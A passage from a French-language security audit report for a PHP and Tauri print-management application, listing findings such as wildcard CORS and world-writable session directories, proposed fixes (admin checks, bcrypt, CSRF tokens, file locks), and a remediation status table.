**Recommandation :** CSP strict dans le webview, validation de tous les arguments côté Rust.

---

### T3. Caddyfile — CORS et proxy

**Fichier :** `Caddyfile`

```caddy
header Access-Control-Allow-Origin *
header Access-Control-Allow-Methods "GET, POST, OPTIONS"
header Access-Control-Allow-Headers "*"
```

Sur un serveur **exposé sur Internet** (`dupli.zvz.fr`), ce CORS `*` est le vecteur d'attaque principal. Il permet à **tout site web** d'envoyer des requêtes cross-origin vers le backend, transformant chaque endpoint sans auth en faille exploitable drive-by.

**Correctif :**
```
header Access-Control-Allow-Origin "https://dupli.zvz.fr"
header Access-Control-Allow-Methods "GET, POST, OPTIONS"
header Access-Control-Allow-Headers "Content-Type, Authorization"
```

---

### T4. Session directory permissions

**Fichier :** `app/public/index.php`

```php
@mkdir($session_path, 0777, true);
```

Répertoire de sessions en 0777 — tout utilisateur local peut lire/voler les sessions.

**Correctif :** `@mkdir($session_path, 0730, true);`

---

## Fausse positives Semgrep

| Finding | Count | Verdict |
|---------|-------|---------|
| `tainted-filename` (basename appliqué) | ~40/117 | **FP partielle** — basename réduit le risque à LOW |
| `unsafe-formatstring` (logs uniquement) | 12/12 | **FP** — contexte de logging, pas d'injection exploitable |
| `php-permissive-cors` | 6/6 | **Confirmé** — vrai problème, pas FP |

---

## Recommandations architecturales

### 1. Auth admin sur les endpoints destructeurs (PRIORITÉ 1)

Pas besoin de middleware global. Un check ciblé au début de chaque fichier sensible :

```php
// Dans : secure_purge.php, save_ai_settings.php, delete_session_job.php,
//        check-print-jobs.php (purge_all), sessions.php (close_all, reassign_job)
//        download_backup.php

session_start();
if (!isset($_SESSION['user']) || $_SESSION['user'] !== '1') {
    http_response_code(403);
    header('Content-Type: application/json');
    exit(json_encode(['error' => 'Réservé à l\'administrateur']));
}
```

**Fichiers à modifier (6 fichiers) :**
- `app/api/secure_purge.php` — purge historique
- `app/api/save_ai_settings.php` — settings IA
- `app/api/delete_session_job.php` — suppression jobs
- `app/api/check-print-jobs.php` (action `purge_all`) — purge print history
- `app/api/sessions.php` (actions `close_all`, `reassign_job`) — manipulation sessions
- `app/public/api/download_backup.php` — téléchargement BDD

### 2. CORS : dupli.zvz.fr au lieu de *

```
# Caddyfile
header Access-Control-Allow-Origin "https://dupli.zvz.fr"

# Si Tauri a aussi besoin d'accès :
header Access-Control-Allow-Origin "https://dupli.zvz.fr, tauri://localhost"
```

Supprimer les `Access-Control-Allow-Origin: *` individuels dans les fichiers PHP.

### 3. Déplacer download_backup.php hors du document root

```
AVANT : public/api/download_backup.php  (accessible directement, hors routeur)
APRÈS : api/download_backup.php         (accessible uniquement via routeur index.php)
```

### 3. CSRF tokens — implémenter sur les endpoints admin

```php
// Génération (déjà existe dans init.php)
// Utilisation sur les endpoints destructeurs uniquement :
fetch('/?save_ai_settings', {
    method: 'POST',
    body: JSON.stringify({...data, csrf_token: getCsrfToken()})
});
```

**Note :** Les endpoints de lecture seule n'ont pas besoin de CSRF — ils ne modifient rien.

### 4. Mdp library → bcrypt

```php
// Stockage
$hashed = password_hash($newPassword, PASSWORD_BCRYPT);
$settings->set('bibliotheque_password', $hashed);

// Vérification
$storedHash = $settingsManager->get('bibliotheque_password', '');
if (!password_verify($_POST['bib_pass'], $storedHash)) {
    // Échec
}
```

### 5. Permissions répertoires

```php
// AVANT
@mkdir($dir, 0777, true);
@chmod($dir, 0777);
// APRÈS
@mkdir($dir, 0700, true);
// Supprimer le chmod 0777
```

### 6. Tauri capabilities — restreindre

```json
// Supprimer :
"allow-all-commands"
"fs:allow-write" (global)
// Remplacer par :
"fs:allow-write-file", "allow": ["specific/path/"]
"shell:allow-execute", "allow": [{"name": "caddy"}, {"name": "dupli-php"}]
```

### 7. Rate limiting auth library

```php
$maxAttempts = 5;
$key = 'bib_auth_' . md5($_SERVER['REMOTE_ADDR']);
$attempts = $_SESSION[$key] ?? 0;
if ($attempts >= $maxAttempts) {
    sleep(pow(2, $attempts - 5));
}
```

### 8. Transactions SQLite pour opérations critiques

```php
$db->exec('BEGIN IMMEDIATE');
// SELECT + INSERT/UPDATE
$db->exec('COMMIT');
```

### 9. Lock files atomiques

```php
$fp = fopen($lockFile, 'c');
if (!flock($fp, LOCK_EX | LOCK_NB)) { exit('busy'); }
ftruncate($fp, 0);
fwrite($fp, time());
// ... travail ...
fclose($fp); // libère le verrou
```

### 10. Spool shadow copy systématique

```php
// Copier le fichier SPL dans un temp file avant traitement
$tmpCopy = tempnam(sys_get_temp_dir(), 'spool_');
copy($splFile, $tmpCopy);
// Traiter $tmpCopy au lieu de $splFile
unlink($tmpCopy);
```

---

## Statut d'avancement des remédiations (Branche `audit-fix`)

Les correctifs de sécurité prioritaires P0/P1 et le premier niveau de nettoyage de code ont été appliqués sur la branche `audit-fix` :

| ID | Vulnérabilité / Action | Statut | Détails de la correction |
|----|------------------------|--------|--------------------------|
| **CORS** | En-têtes CORS permissifs `*` | **[FAIT]** | Restreint à `https://dupli.zvz.fr` dans `Caddyfile` et supprimé dans tous les scripts PHP. |
| **C2** | Purge non authentifiée (`secure_purge.php`) | **[FAIT]** | Ajout d'une vérification de session admin (`$_SESSION['user'] === "1"`). |
| **C3** | Suppression de job sans auth (`delete_session_job.php`) | **[FAIT]** | Ajout de la vérification de session admin. |
| **C4** | Actions sensibles de sessions (`sessions.php`) | **[FAIT]** | `close_all` protégé par l'admin. `reassign_job` laissé accessible aux utilisateurs pour l'assignation manuelle des impressions. |
| **C5** | Téléchargement BDD SQLite sans auth (`download_backup.php`) | **[FAIT]** | Fichier déplacé hors du webroot public vers `app/api/` + vérification de session admin. |
| **C6** | Configuration IA sans auth (`save_ai_settings.php`) | **[FAIT]** | Vérification de session admin ajoutée. |
| **C7** | Injection de commande (`install_local_ai.php`) | **[FAIT]** | Sanitization avec `escapeshellarg()` sur `$targetDir` et `$scriptPath` + auth admin. |
| **H10** | Purge complète d'historique (`check-print-jobs.php` `purge_all`) | **[FAIT]** | Actions de suppression (`delete_jobs`, `delete_by_job_id`, `purge_all`) réservées aux admins. |
| **H11** | Fuite de session en debug (`upload_aide_pdf.php`) | **[FAIT]** | Supprimé le champ `'debug' => $_SESSION` en réponse 401. |
| **H8** | Multiplicateur `fill_rate` non borné (`save_auto_print.php`) | **[FAIT]** | Validation et restriction de `$fill_rate` entre `0.05` et `1.0`. |
| **H2** | Hachage Bcrypt du mdp bibliothèque (`save_ai_settings.php`) | **[FAIT]** | Stockage en `password_hash(PASSWORD_BCRYPT)` avec auto-migration transparente des anciens mots de passe en clair. |
| **H7** | Rate Limiting Bibliothèque (`bibliotheque.html.php`) | **[FAIT]** | Limitation à 5 tentatives échouées avec blocage temporaire de 60s. |
| **H1** | Token CSRF & Helper (`init.php`) | **[FAIT]** | Ajout de `require_csrf_token()` et renforcement de `verify_csrf_token()`. |
| **H9** | Validation notifications moniteur (`print-notification.php`) | **[FAIT]** | Sanitization et bornage strict des entrées numériques (`jobId`, `totalPages`, `copies`, `size`). |
| **H5 & RC1** | Shadow copy des spools PCL/EMF/XPS | **[FAIT]** | Isolation du fichier SPL dans un fichier temporaire unique avec suppression automatique à l'issue de l'exécution pour éliminer TOCTOU. |
| **M4 & RC4** | Verrous atomiques `flock` sur maintenance/indexation | **[FAIT]** | Application de verrous exclusifs non-bloquants `flock(LOCK_EX \| LOCK_NB)` sur `start_indexing.php` et `run_background_maintenance.php`. |
| **M1 & M2** | Securisation des sessions (`admin.php`, `index.php`) | **[FAIT]** | `session_regenerate_id(true)` au login + route `?logout` avec `session_destroy()` et invalidation du cookie. |
| **M3** | Permissions répertoires temporaires (`utilities.php`) | **[FAIT]** | Remplacement des permissions `0777` par `0700`. |
| **T1** | Capabilities Tauri sur-permissives (`default.json`) | **[FAIT]** | Supprimé `"allow-all-commands"`. |
| **P0** | Nettoyage du code mort et scripts de patch | **[FAIT]** | Suppression des 9 fichiers PHP obsolètes et des 4 scripts JS orphelins. |

---

## Matrice de remédiation

| Priorité | Actions | Effort | Délai | Statut |
|----------|---------|--------|-------|--------|
| **P0 — Immédiat** | CORS `*` → `https://dupli.zvz.fr` (Caddyfile + PHP) | 0.5 jour | Semaine 1 | **[FAIT]** |
| | Auth admin sur `secure_purge.php` (C2) | 0.25 jour | Semaine 1 | **[FAIT]** |
| | Auth admin sur `save_ai_settings.php` (C6) | 0.25 jour | Semaine 1 | **[FAIT]** |
| | Auth admin sur `delete_session_job.php` (C3) | 0.25 jour | Semaine 1 | **[FAIT]** |
| | Auth admin sur `download_backup.php` (C5) | 0.25 jour | Semaine 1 | **[FAIT]** |
| | Auth admin sur `sessions.php` close_all (C4) | 0.25 jour | Semaine 1 | **[FAIT]** |
| | Auth admin sur `check-print-jobs.php` purge_all (H10) | 0.25 jour | Semaine 1 | **[FAIT]** |
| | Fix RCE (`install_local_ai.php`) | 1 jour | Semaine 1 | **[FAIT]** |
| **P1 — Court terme** | Mdp library → bcrypt (H2) | 1 jour | Semaine 2 | **[FAIT]** |
| | Rate limit auth library (H7) | 0.5 jour | Semaine 2 | **[FAIT]** |
| | CSRF tokens sur endpoints admin (H1) | 1 jour | Semaine 2 | **[FAIT]** |
| | Supprimer $_SESSION debug (H11) | 0.25 jour | Semaine 2 | **[FAIT]** |
| | Fix fill_rate client (H8) | 0.25 jour | Semaine 2 | **[FAIT]** |
| | Auth / sanitization sur print endpoints (H9) | 0.5 jour | Semaine 2 | **[FAIT]** |
| **P2 — Moyen terme** | Déplacer download_backup.php hors public/ | 0.5 jour | Semaine 3 | **[FAIT]** |
| | Fix realpath TOCTOU (H4) | 1 jour | Semaine 3 | **[FAIT]** |
| | Spool shadow copy (H5, RC1) | 2 jours | Semaine 3 | **[FAIT]** |
| | Lock atomiques (M4, RC4) | 1 jour | Semaine 3 | **[FAIT]** |
| | Permissions temp dirs 0777 → 0700 (M3) | 0.5 jour | Semaine 3 | **[FAIT]** |
| | Session fixation + logout (M1, M2) | 1 jour | Semaine 3 | **[FAIT]** |
| | Tauri capabilities restreintes (T1) | 1 jour | Semaine 3 | **[FAIT]** |
| | Fix double start sidecars (H6) | 1 jour | Semaine 3 | À faire |
| **P3 — Continu** | Semgrep findings (460+) | 2-3 jours/mois | Continu | À faire |
| | GitHub Actions pin SHA (M9) | 0.5 jour | Mois 2 | À faire |
| | Cleanup patch_*.php / fix_*.php | 0.5 jour | Mois 2 | **[FAIT]** |

---

## Annexe — Fichiers affectés (top 15)

| Fichier | Findings | Types |
|---------|----------|-------|
| `app/api/studio_process.php` | 58 | Injection, exec, unlink |
| `app/api/convert-emf-to-png.php` | 34 | Command injection, TOCTOU |
| `app/api/convert-xps-to-png.php` | 28 | Command injection, SSRF |
| `app/public/index.php` | 28 | Debug, path traversal, auth |
| `app/api/convert-pcl-to-png.php` | 27 | Command injection |
| `app/api/sessions.php` | 20+ | No auth, IDOR, SQL |
| `app/api/secure_purge.php` | 15+ | No auth, mass delete |
| `app/api/check-print-jobs.php` | 15+ | No auth, purge, SQL |
| `app/api/print-notification.php` | 10+ | No auth, CORS |
| `app/api/save_ai_settings.php` | 10+ | No auth, SSRF |
| `app/api/delete_session_job.php` | 8 | No auth, IDOR |
| `app/api/download_backup.php` | 8 | No auth, data leak |
| `app/controler/functions/init.php` | 10 | CSRF unused, debug |
| `app/controler/functions/paths.php` | 8 | 0777 perms |
| `src-tauri/capabilities/default.json` | 5 | Over-permissioning |
